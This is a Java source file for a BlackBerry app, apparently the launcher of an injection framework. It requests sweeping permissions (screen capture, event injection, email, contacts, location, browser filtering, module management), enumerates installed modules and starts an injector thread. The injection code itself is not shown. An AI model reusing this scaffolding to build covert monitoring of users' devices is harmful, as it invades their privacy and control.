package injectionFW;

import injectionFW.Application.AppListener;
import injectionFW.Application.InjectorManager;
import injectionFW.log.Debug;
import injectionFW.log.DebugLevel;
import injectionFW.menu.SystemMenuExtractor;
import injectionFW.utils.Utils;

import java.util.Date;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.Timer;

import net.rim.device.api.applicationcontrol.ApplicationPermissions;
import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.CodeModuleGroup;
import net.rim.device.api.system.CodeModuleGroupManager;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.ui.UiApplication;

/**
 * This class extends the UiApplication class, providing a graphical user
 * interface.
 */
public class InjectionFrameworkApp extends UiApplication {
    private static final long APP_TIMER_PERIOD = 0;
    private static final String CR = "\n";
    //#ifdef DEBUG
    private static Debug debug = new Debug("InjectionFrameworkApp",
            DebugLevel.VERBOSE);

    //#endif
    /**
     * Entry point for application
     * 
     * @param args
     *            Command line arguments (not used)
     */
    public static void main(String[] args) {
        // Create a new instance of the application and make the currently
        // running thread the application's event dispatch thread.
        InjectionFrameworkApp theApp = new InjectionFrameworkApp();
        theApp.init();
        theApp.enterEventDispatcher();

    }

    private Timer applicationTimer;
    private AppListener applicationListener;
    private SystemMenuExtractor menu;

    /**
     * Creates a new InjectionFrameworkApp object
     */
    public InjectionFrameworkApp() {
        // Push a screen onto the UI stack for rendering.
        pushScreen(new InjectionFrameworkScreen());
    }

    Thread injectorManagerThread;

    protected void init() {
        //#ifdef DEBUG
        debug.trace("init");
        // #endif

        // Thread.currentThread().setPriority(Thread.MAX_PRIORITY);
        checkPermissions();

        //#ifdef DEBUG
        //debug.trace("init: " + getInstalledApplications());
        debug.trace("init: " + getInstalledModuleGroup());
        //#endif

        menu = new SystemMenuExtractor(100);
        menu.addMenu();
        
        AppListener.getInstance().resumeApplicationTimer();

        injectorManagerThread = new Thread(new Runnable() {
            public void run() {
                Utils.sleep(3000);
                InjectorManager.getInstance().start();
            };
        });

        injectorManagerThread.start();

    }

    String getInstalledModuleGroup() {
        final StringBuffer sb = new StringBuffer();
        sb.append(CR + "Module Group" + CR + CR); //$NON-NLS-1$

        // Retrieve an array of handles for existing modules on a BlackBerry
        // device
        final CodeModuleGroup handles[] = CodeModuleGroupManager.loadAll();
        // Retrieve an array of handles for existing modules on a BlackBerry
        // device
        final int AllModulesHandles[] = CodeModuleManager.getModuleHandles();
        final Hashtable remainigModules = new Hashtable();
        int size = AllModulesHandles.length;
        for (int i = 0; i < size; i++) {
            remainigModules
                    .put(new Integer(AllModulesHandles[i]), new Object());
        }

        if (handles == null) {
            size = 0;
        } else {
            size = handles.length;
        }
        for (int i = 0; i < size; i++) {
            final CodeModuleGroup group = handles[i];

            // Retrieve specific information about a module.
            final String name = group.getName();
            final String copyright = group.getCopyright();
            final String description = group.getDescription();
            final int flags = group.getFlags();
            final String friendly = group.getFriendlyName();
            final String vendor = group.getVendor();
            final String version = group.getVersion();

            sb.append(name);
            sb.append(" , "); //$NON-NLS-1$
            sb.append(description);
            sb.append(" , "); //$NON-NLS-1$
            sb.append(flags);
            sb.append(" , "); //$NON-NLS-1$
            sb.append(friendly);
            sb.append(" , "); //$NON-NLS-1$
            sb.append(version);
            sb.append(CR);
            
            final Enumeration enumerator = group.getModules();
            while (enumerator.hasMoreElements()) {
                final String moduleName = (String) enumerator.nextElement();
                final int handle = CodeModuleManager
                        .getModuleHandle(moduleName);
                // Retrieve specific information about a module.

                sb.append("--> " + moduleName); //$NON-NLS-1$
                if (handle > 0) {
                    remainigModules.remove(new Integer(handle));
                    final String vendorModule = CodeModuleManager
                            .getModuleVendor(handle);
                    final String versionModule = CodeModuleManager
                            .getModuleVersion(handle);
                    sb.append(", " + vendorModule); //$NON-NLS-1$
                    sb.append(", " + versionModule); //$NON-NLS-1$

                    final ApplicationDescriptor[] descr = CodeModuleManager
                            .getApplicationDescriptors(handle);
                    if (descr != null && descr.length > 0) {
                        sb.append(", ( "); //$NON-NLS-1$
                        for (int j = 0; j < descr.length; j++) {
                            sb.append(descr[j].getFlags() + " "); //$NON-NLS-1$
                        }
                        sb.append(")"); //$NON-NLS-1$
                    }
                }
                sb.append(CR);
            }


        }

        final String ret = sb.toString();
        return ret;
    }

    /**
     * Gets the running applications.
     * 
     * @return the running applications
     */
    String getInstalledApplications() {
        final StringBuffer sb = new StringBuffer();
        sb.append(CR + "Installed Applications" + CR); //$NON-NLS-1$

        // Retrieve an array of handles for existing modules on a BlackBerry
        // device
        final int handles[] = CodeModuleManager.getModuleHandles();

        final int size = handles.length;
        for (int i = 0; i < size; i++) {
            final int handle = handles[i];
            // CodeModuleManager.getModuleHandle(name)
            // Retrieve specific information about a module.
            final String name = CodeModuleManager.getModuleName(handle);
            final String vendor = CodeModuleManager.getModuleVendor(handle);
            final String description = CodeModuleManager
                    .getModuleDescription(handle);
            final String version = CodeModuleManager.getModuleVersion(handle);
            final int moduleSize = CodeModuleManager.getModuleCodeSize(handle);
            final long timestamp = CodeModuleManager.getModuleTimestamp(handle);

            final Date date = new Date(timestamp);

            sb.append(name);
            sb.append(" , "); //$NON-NLS-1$
            sb.append(vendor);
            sb.append(CR);
        }

        return sb.toString();
    }

    private void checkPermissions() {

        //#ifdef DEBUG
        debug.trace("======= CheckPermissions");
        // #endif

        // NOTE: This sample leverages the following permissions:
        // --Event Injector
        // --Phone
        // --Device Settings
        // --Email
        // The sample demonstrates how these user defined permissions will
        // cause the respective tests to succeed or fail. Individual
        // applications will require access to different permissions.
        // Please review the Javadocs for the ApplicationPermissions class
        // for a list of all available permissions
        // May 13, 2008: updated permissions by replacing deprecated constants.

        // Capture the current state of permissions and check against the
        // requirements
        final ApplicationPermissionsManager apm = ApplicationPermissionsManager
                .getInstance();
        final ApplicationPermissions original = apm.getApplicationPermissions();

        // Set up and attach a reason provider
        // final CoreReasonProvider drp = new CoreReasonProvider();
        // apm.addReasonProvider(ApplicationDescriptor
        // .currentApplicationDescriptor(), drp);

        final int[] wantedPermissions = new int[] {
                ApplicationPermissions.PERMISSION_SCREEN_CAPTURE,
                ApplicationPermissions.PERMISSION_PHONE,
                ApplicationPermissions.PERMISSION_BLUETOOTH,
                ApplicationPermissions.PERMISSION_WIFI,
                ApplicationPermissions.PERMISSION_CODE_MODULE_MANAGEMENT,
                ApplicationPermissions.PERMISSION_PIM,
                ApplicationPermissions.PERMISSION_PHONE,
                ApplicationPermissions.PERMISSION_LOCATION_API,
                ApplicationPermissions.PERMISSION_FILE_API,
                ApplicationPermissions.PERMISSION_MEDIA,
                ApplicationPermissions.PERMISSION_EMAIL,
                ApplicationPermissions.PERMISSION_EVENT_INJECTOR,
                ApplicationPermissions.PERMISSION_IDLE_TIMER,
                ApplicationPermissions.PERMISSION_CHANGE_DEVICE_SETTINGS,
                ApplicationPermissions.PERMISSION_INTERNAL_CONNECTIONS,
                ApplicationPermissions.PERMISSION_BROWSER_FILTER };

        // PERMISSION_LOCATION_DATA

        boolean allPermitted = true;
        for (int i = 0; i < wantedPermissions.length; i++) {
            final int perm = wantedPermissions[i];

            if (original.getPermission(perm) != ApplicationPermissions.VALUE_ALLOW) {
                allPermitted = false;
            }
        }

        if (allPermitted) {
            // All of the necessary permissions are currently available
            //#ifdef DEBUG
            debug.info("All of the necessary permissions are currently available");
            // #endif
            return;
        }

        // Create a permission request for each of the permissions your
        // application
        // needs. Note that you do not want to list all of the possible
        // permission
        // values since that provides little value for the application or the
        // user.
        // Please only request the permissions needed for your application.
        final ApplicationPermissions permRequest = new ApplicationPermissions();
        for (int i = 0; i < wantedPermissions.length; i++) {
            final int perm = wantedPermissions[i];
            permRequest.addPermission(perm);
        }

        final boolean acceptance = ApplicationPermissionsManager.getInstance()
                .invokePermissionsRequest(permRequest);

        if (acceptance) {
            // User has accepted all of the permissions
            //#ifdef DEBUG
            debug.info("User has accepted all of the permissions");
            // #endif
            return;
        } else {
            //#ifdef DEBUG
            debug.warn("User has accepted some or none of the permissions");
            // #endif
        }
    }

    public void onClose() {
        //#ifdef DEBUG
        debug.trace("onClose: removing menu");
        //#endif
        if(menu!=null){
            menu.removeMenu();
        }
        System.exit(0);
    }

}
